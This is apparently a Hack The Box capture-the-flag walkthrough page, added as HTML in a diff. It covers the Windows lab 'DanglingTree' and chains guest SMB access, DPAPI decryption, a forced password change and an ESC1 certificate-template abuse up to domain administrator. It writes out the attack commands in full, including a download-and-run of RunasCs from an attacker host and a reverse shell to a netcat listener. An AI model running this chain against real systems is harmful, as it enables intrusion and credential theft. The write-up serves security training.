@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>DanglingTree — .d4nx0</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Oxanium:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
+  <link rel="stylesheet" href="../css/style.css" />
+</head>
+<body>
+  <div class="layout">
+    <aside class="sidebar" id="sidebar">
+      <a href="../index.html" class="sidebar-logo">
+        <div class="logo-icon"><i class="bx bx-terminal"></i></div>
+        <span class="logo-typewriter"><span id="typewriter"></span><span class="cursor-bar"></span></span>
+      </a>
+      <nav class="sidebar-nav">
+        <div class="nav-section">// INDEX</div>
+        <a href="../index.html" class="nav-link"><i class="bx bx-terminal"></i><span>OVERVIEW</span></a>
+        <a href="index.html" class="nav-link active"><i class="bx bx-file"></i><span>WRITEUPS</span></a>
+        <a href="../commands/index.html" class="nav-link"><i class="bx bx-code-alt"></i><span>COMMANDS</span></a>
+        <a href="../techniques/index.html" class="nav-link"><i class="bx bx-target-lock"></i><span>TECHNIQUES</span></a>
+      </nav>
+      <div class="sidebar-footer">
+        <div class="session"><span class="session-dot"></span><span>SESSION ACTIVE</span></div>
+        <button type="button" class="collapse-btn" id="collapseBtn"><i class="bx bx-left-arrow-alt"></i><span>collapse</span></button>
+      </div>
+    </aside>
+    <div class="main">
+      <div class="content">
+        <a href="index.html" class="back-link"><i class="bx bx-left-arrow-alt"></i> Back to writeups</a>
+
+        <div class="note-header">
+          <h1>DanglingTree</h1>
+          <div class="note-meta">
+            <div class="row"> HTB Season <span class="highlight">11</span> Week <span class="highlight">#12</span></div>
+            <div class="row"> Machine <span class="highlight">DanglingTree</span></div>
+            <div class="row"> OS <span class="highlight">Windows</span></div>
+            <div class="row"> Difficulty <span class="highlight">Medium</span></div>
+            <div class="row"> Vulnerabilities [<span class="highlight">Guest SMB</span>] [<span class="highlight">DPAPI</span>] [<span class="highlight">ESC1</span>] [<span class="highlight">AD CS</span>]</div>
+          </div>
+        </div>
+
+        <div class="note-content">
+          <div class="callout info">
+            <strong>📌 Summary</strong>
+            Domain controller with guest-readable IT share (RoE PDF → low-priv creds). Chain through mail/WAC secrets → <code>noah.b</code> → DPAPI for <code>alex.o</code> → force-change <code>jake.h</code> → create missing ESC1 cert template → admin PFX → SYSTEM.
+          </div>
+
+          <h2>1. Reconnaissance</h2>
+          <h3>Ports Scan</h3>
+          <pre><code>rustscan -a <span class="ph">&lt;target-ip&gt;</span> -- -sC -sV -T4 -oA nmap-result</code></pre>
+
+          <p><strong>Key Open Ports:</strong></p>
+          <ul>
+            <li><strong>53/88/389/445/636</strong> – AD DC (DNS, Kerberos, LDAP, SMB)</li>
+            <li><strong>80/443</strong> – IIS</li>
+            <li><strong>3389</strong> – RDP</li>
+            <li><strong>6600</strong> – Windows Admin Center (HTTPS)</li>
+            <li><strong>Host:</strong> <code>DC</code> · Domain: <code>danglingtree.htb</code></li>
+          </ul>
+
+          <div class="callout info">
+            <strong>💡 Info</strong>
+            <pre><code>echo '<span class="ph">&lt;target-ip&gt;</span> danglingtree.htb dc.danglingtree.htb' | sudo tee -a /etc/hosts</code></pre>
+          </div>
+
+          <h3>Guest SMB — IT Share</h3>
+          <pre><code>smbclient -L //danglingtree.htb// -N
+smbclient //danglingtree.htb/IT -N
+# \Security\DanglingTree_RoE_Assessment.pdf
+
+pdftotext DanglingTree_RoE_Assessment.pdf -
+# anderson.w:R3dT3am@Acc3ss#01</code></pre>
+
+          <pre><code>nxc smb <span class="ph">&lt;target-ip&gt;</span> -d danglingtree.htb -u anderson.w -p 'R3dT3am@Acc3ss#01'
+nxc smb <span class="ph">&lt;target-ip&gt;</span> -d danglingtree.htb -u anderson.w -p 'R3dT3am@Acc3ss#01' --shares
+nxc smb <span class="ph">&lt;target-ip&gt;</span> -d danglingtree.htb -u anderson.w -p 'R3dT3am@Acc3ss#01' --users --rid-brute 3000</code></pre>
+
+                              <h2>2. Exploitation</h2>
+          <h3>Windows Admin Center (port 6600)</h3>
+          <p>Log in at <code>https://danglingtree.htb:6600/</code> with <code>anderson.w</code> / <code>R3dT3am@Acc3ss#01</code>.</p>
+
+          <div class="note-image">
+            <img src="../src/images/danglingtree/danglingtree-1.png" alt="Windows Admin Center sign-in" onclick="toggleZoom(this)">
+          </div>
+
+          <p>Connecting to the gateway as <code>anderson.w</code> is blocked by RBAC in the UI:</p>
+
+          <div class="note-image">
+            <img src="../src/images/danglingtree/danglingtree-2.png" alt="WAC connection error — blocked by RBAC" onclick="toggleZoom(this)">
+          </div>
+
+          <p>WAC reports version <strong>2511</strong> / build <strong>2.6.4.11</strong>:</p>
+
+          <div class="note-image">
+            <img src="../src/images/danglingtree/danglingtree-3.png" alt="WAC version 2511 build 2.6.4.11" onclick="toggleZoom(this)">
+          </div>
+
+          <p>From the browser console, the SME PowerShell endpoint still accepts commands via <code>invokeWac</code> — UI RBAC is bypassed (<code>whoami</code> returns <code>danglingtree\anderson.w</code>):</p>
+
+          <div class="note-image">
+            <img src="../src/images/danglingtree/danglingtree-4.png" alt="Browser console RCE as anderson.w" onclick="toggleZoom(this)">
+          </div>
+
+          <p>Module in use: <code>msft.sme.shell</code> <strong>6.8.9</strong>.</p>
+
+          <div class="note-image">
+            <img src="../src/images/danglingtree/danglingtree-5.png" alt="msft.sme.shell version 6.8.9" onclick="toggleZoom(this)">
+          </div>
+
+          <p>From this context you can reach internal services (e.g. SmarterMail on localhost after a tunnel):</p>
+
+          <div class="note-image">
+            <img src="../src/images/danglingtree/danglingtree-6.png" alt="SmarterMail login" onclick="toggleZoom(this)">
+          </div>
+
+          <h3>svc_mail → Noah Password (DES)</h3>
+          <p>Service binaries / mail stack yield ciphertext plus hardcoded DES key material. Crack with PyCryptodome:</p>
+          <pre><code>from base64 import b64decode
+from Crypto.Cipher import DES
+from Crypto.Util.Padding import unpad
+
+ciphertext = b64decode("66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby")
+keymaps = {
+    "keymap1": (
+        bytes([125, 113, 232, 233, 160, 34, 123, 208]),
+        bytes([224, 222, 8, 14, 29, 138, 139, 223]),
+    ),
+    "keymap2": (
+        bytes([180, 63, 132, 209, 16, 180, 233, 145]),
+        bytes([1, 216, 174, 230, 73, 173, 146, 39]),
+    ),
+}
+for name, (key, iv) in keymaps.items():
+    try:
+        plaintext = unpad(DES.new(key, DES.MODE_CBC, iv).decrypt(ciphertext), 8)
+        print(f"{name}: {plaintext.decode()}")
+    except (ValueError, UnicodeDecodeError):
+        pass
+# keymap2: RiverDragon#Storm25</code></pre>
+
+          <p>No WinRM — use <strong>RunasCs</strong> from the <code>svc_mail</code> context to spawn a shell as <code>noah.b</code>:</p>
+          <pre><code># attacker
+nc -lnvp 6666
+python3 -m http.server 8000
+
+# target
+(New-Object Net.WebClient).DownloadFile('http://<span class="ph">&lt;attacker-ip&gt;</span>:8000/RunasCs.exe', 'C:\Windows\Temp\RunasCs.exe')
+C:\Windows\Temp\RunasCs.exe noah.b 'RiverDragon#Storm25' cmd.exe -r <span class="ph">&lt;attacker-ip&gt;</span>:6666</code></pre>
+
+          <h3>DPAPI → <code>alex.o</code></h3>
+          <pre><code>cmdkey /list
+# Domain:target=PC01.danglingtree.htb  User: alex.o
+
+Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force
+Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Recurse -Force</code></pre>
+
+          <p>Exfil master key + credential blob, decrypt offline:</p>
+          <pre><code>impacket-dpapi masterkey \
+  -file f53fcaba-f057-48e8-8f92-0180d274bf0f \
+  -sid 'S-1-5-21-4220238332-57023728-1129110646-1602' \
+  -password 'RiverDragon#Storm25'
+
+impacket-dpapi credential \
+  -file 57FFB67D684C67F09E7153B9C7CC3940 \
+  -key 0x<span class="ph">&lt;masterkey-hex&gt;</span>
+# alex.o:SunsetMountainPeak@2025</code></pre>
+
+          <h3>Force Change <code>jake.h</code></h3>
+          <p>BloodHound: <code>alex.o</code> (Support-IT) can force-change password on <code>jake.h</code>.</p>
+          <pre><code>bloodyAD -H dc.danglingtree.htb -i <span class="ph">&lt;target-ip&gt;</span> \
+  -d danglingtree.htb \
+  -u alex.o -p 'SunsetMountainPeak@2025' \
+  -s set password jake.h 'Admin@123'</code></pre>
+
+<h2>3. Privilege Escalation</h2>
+          <h3>AD CS — Create Missing ESC1 Template</h3>
+          <p><code>jake.h</code> is Template Editor / DevOps PKI: can <code>CREATE_CHILD</code> under Certificate Templates and OID containers, but several published template names have <strong>no objects</strong>.</p>
+          <pre><code>bloodyAD -H dc.danglingtree.htb -i <span class="ph">&lt;target-ip&gt;</span> \
+  -d danglingtree.htb -u jake.h -p 'Admin@123' \
+  -s get writable --partition CONFIGURATION --right CHILD --detail
+
+# CREATE_CHILD on CN=Certificate Templates and CN=OID</code></pre>
+
+          <p>Create <code>EmployeeAuthTemplate</code> (OID + template object), then configure as ESC1:</p>
+          <pre><code>python3 create_template.py \
+  -H dc.danglingtree.htb \
+  -u 'jake.h@danglingtree.htb' \
+  -p 'Admin@123' \
+  -t EmployeeAuthTemplate
+
+certipy template \
+  -u 'jake.h@danglingtree.htb' -p 'Admin@123' \
+  -dc-ip <span class="ph">&lt;target-ip&gt;</span> -dc-host dc.danglingtree.htb \
+  -template EmployeeAuthTemplate \
+  -write-default-configuration S-1-5-11 \
+  -no-save -force
+
+certipy find \
+  -u 'jake.h@danglingtree.htb' -p 'Admin@123' \
+  -dc-ip <span class="ph">&lt;target-ip&gt;</span> -dc-host dc.danglingtree.htb \
+  -vulnerable
+# ESC1 / ESC15 / ESC4</code></pre>
+
+          <h3>Request Admin Cert → SYSTEM</h3>
+          <pre><code>sudo ntpdate -u danglingtree.htb
+
+rpcclient -U 'DANGLINGTREE/jake.h%Admin@123' dc.danglingtree.htb -c 'lsaquery'
+# domain SID + RID 500
+
+certipy req \
+  -u 'jake.h@danglingtree.htb' -p 'Admin@123' \
+  -dc-ip <span class="ph">&lt;target-ip&gt;</span> -dc-host dc.danglingtree.htb \
+  -ca danglingtree-DC-CA \
+  -template EmployeeAuthTemplate \
+  -upn 'administrator@danglingtree.htb' \
+  -sid 'S-1-5-21-4220238332-57023728-1129110646-500' \
+  -dynamic-endpoint \
+  -out administrator.pfx
+
+certipy auth \
+  -pfx administrator.pfx \
+  -dc-ip <span class="ph">&lt;target-ip&gt;</span> \
+  -domain danglingtree.htb \
+  -username administrator
+
+impacket-psexec \
+  'danglingtree.htb/Administrator@dc.danglingtree.htb' \
+  -hashes ':<span class="ph">&lt;NT-HASH&gt;</span>'</code></pre>
+
+          <h2>4. Flag Paths</h2>
+          <ul>
+            <li><strong>User flag:</strong> <code>C:\Users\noah.b\Desktop\user.txt</code></li>
+            <li><strong>Root flag:</strong> <code>C:\Users\Administrator\Desktop\root.txt</code></li>
+          </ul>
+
+          <div class="callout info">
+            <strong>✅ Lessons Learned</strong>
+            Guest-readable assessment PDFs are free creds. Hardcoded crypto in service binaries plus RunasCs closed the gap to interactive users. DPAPI on a workstation credential bag yielded lateral movement; Support-IT force-change handed Template Editor rights. Published CA template names without matching objects let an attacker <em>create</em> an ESC1 template and mint a Domain Admin certificate. Audit guest shares, protect DPAPI secrets, and ensure published templates exist with locked-down enrollment ACLs.
+          </div>
+        </div>
+
+      </div>
+      <footer class="page-footer">// NOTES ARE STATIC, VERSIONED IN GIT — EDIT HTML AND PUSH</footer>
+    </div>
+  </div>
+  <button type="button" class="mobile-toggle" id="mobileToggle" aria-label="Menu"><i class="bx bx-menu"></i></button>
+  <script src="../js/app.js"></script>
+  <script>
+    document.querySelectorAll('.note-content pre code').forEach(function (block) {
+      var html = block.innerHTML;
+      html = html.replace(/^(# .*)/gm, '<span class="comment">$1</span>');
+      var commands = ['wget','python3','sudo','nmap','rustscan','ssh','nxc','smbclient','pdftotext','bloodyAD','certipy','impacket-dpapi','impacket-psexec','rpcclient','ntpdate','echo','nc','curl'];
+      var regex = new RegExp('\\b(' + commands.join('|') + ')\\b(?= |$)', 'gm');
+      html = html.replace(regex, '<span class="cmd">$1</span>');
+      block.innerHTML = html;
+    });
+    document.querySelectorAll('.note-content pre').forEach(function (pre) {
+      if (pre.parentElement && pre.parentElement.classList.contains('code-wrap')) return;
+      var wrap = document.createElement('div');
+      wrap.className = 'code-wrap';
+      pre.parentNode.insertBefore(wrap, pre);
+      wrap.appendChild(pre);
+      var btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'copy-btn';
+      btn.textContent = 'Copy';
+      btn.addEventListener('click', function () {
+        var code = pre.querySelector('code');
+        var text = code ? code.innerText : pre.innerText;
+        navigator.clipboard.writeText(text).then(function () {
+          btn.textContent = 'Copied!';
+          btn.classList.add('copied');
+          setTimeout(function () { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+        });
+      });
+      wrap.appendChild(btn);
+    });
+    function toggleZoom(img) {
+      img.classList.toggle('expanded');
+      if (img.classList.contains('expanded')) {
+        setTimeout(function () { img.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 100);
+      }
+    }
+  </script>
+</body>
+</html>
